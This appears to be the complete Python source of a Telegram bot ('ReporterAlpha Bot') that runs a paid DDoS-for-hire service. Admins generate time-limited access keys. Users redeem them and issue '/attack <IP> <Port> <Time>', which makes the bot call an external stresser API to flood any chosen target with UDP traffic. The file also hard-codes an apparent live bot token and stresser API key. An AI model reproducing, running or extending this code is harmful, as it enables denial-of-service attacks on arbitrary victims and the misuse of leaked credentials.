import telebot
import requests
import threading
import time
import sqlite3
from datetime import datetime, timedelta

# --- CONFIGURATION ---
TOKEN = '8617013378:AAF0hzLSsl0bc34KRg5HWMtg3cTTVj7daRI'
ADMIN_ID = 8097952475  # <--- Apna real Telegram ID yahan dalein
API_KEY = "663070-bqV6U2VpqBycMiXgB80rmFONZV9sOki3"

bot = telebot.TeleBot(TOKEN)

# --- DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    # Users table: user_id, expiry_timestamp
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    # Keys table: key_string, duration_hours
    c.execute('''CREATE TABLE IF NOT EXISTS keys 
                 (key_code TEXT PRIMARY KEY, duration INTEGER)''')
    conn.commit()
    conn.close()

init_db()

# --- HELPER FUNCTIONS ---
def check_auth(user_id):
    if user_id == ADMIN_ID: return True
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT expiry FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        expiry_time = datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S')
        if datetime.now() < expiry_time:
            return True
    return False

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['genkey'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID:
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: `/genkey 1h` or `/genkey 30d`", parse_mode="Markdown")
        return

    duration_str = args[1].lower()
    import secrets
    new_key = "KEY-" + secrets.token_hex(4).upper()
    
    # Logic for hours vs days
    try:
        if 'h' in duration_str:
            hours = int(duration_str.replace('h', ''))
        elif 'd' in duration_str:
            hours = int(duration_str.replace('d', '')) * 24
        else:
            bot.reply_to(message, "Invalid format! Use 'h' for hours or 'd' for days.")
            return

        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT INTO keys VALUES (?, ?)", (new_key, hours))
        conn.commit()
        conn.close()
        
        bot.reply_to(message, f"🔑 **Key Generated!**\nCode: `{new_key}`\nDuration: {duration_str}", parse_mode="Markdown")
    except:
        bot.reply_to(message, "Error generating key.")

# --- USER COMMANDS ---
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: `/redeem YOUR_KEY`", parse_mode="Markdown")
        return

    user_key = args[1]
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute("SELECT duration FROM keys WHERE key_code=?", (user_key,))
    row = c.fetchone()

    if row:
        duration_hours = row[0]
        # Calculate new expiry
        new_expiry = datetime.now() + timedelta(hours=duration_hours)
        expiry_str = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
        
        c.execute("INSERT OR REPLACE INTO users (user_id, expiry) VALUES (?, ?)", (message.from_user.id, expiry_str))
        c.execute("DELETE FROM keys WHERE key_code=?", (user_key,)) # One-time use
        conn.commit()
        bot.reply_to(message, f"✅ **Success!** Your access expires on: `{expiry_str}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Invalid or Expired Key.")
    conn.close()

# --- ATTACK LOGIC (UNCHANGED BUT ADDED AUTH CHECK) ---
def attack_logic(ip, port, duration, msg, chat_id):
    api_link = f"https://api.stresser.net/v1?key={API_KEY}&target={ip}&port={port}&time={duration}&method=UDP"
    try:
        response = requests.get(api_link, timeout=10)
        if response.status_code != 200:
            bot.edit_message_text(f"❌ API Error", chat_id, msg.message_id)
            return 
    except:
        return

    remaining = int(duration)
    while remaining > 0:
        try:
            bot.edit_message_text(f"🚀 **Attack Live!**\n⏳ Time Left: {remaining}s", chat_id, msg.message_id, parse_mode="Markdown")
            time.sleep(5) 
            remaining -= 5
        except: break
    bot.edit_message_text(f"✅ **Attack Finished!**", chat_id, msg.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    # AUTH CHECK
    if not check_auth(message.from_user.id):
        bot.reply_to(message, "🚫 **Access Denied!** Buy a key first using `/redeem`.", parse_mode="Markdown")
        return

    try:
        args = message.text.split()
        if len(args) < 4:
            bot.reply_to(message, "❌ **Format:** `/attack <IP> <Port> <Time>`")
            return
            
        sent_msg = bot.reply_to(message, "⚡ **Initializing API...**")
        threading.Thread(target=attack_logic, args=(args[1], args[2], args[3], sent_msg, message.chat.id)).start()
    except Exception as e:
        bot.reply_to(message, "⚠️ Error in command.")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "🔥 **ReporterAlpha Bot**\n\n1. `/genkey 1h/30d` (Admin)\n2. `/redeem <key>`\n3. `/attack <IP> <Port> <Time>`", parse_mode="Markdown")

print("Bot is running...")
bot.polling(none_stop=True)
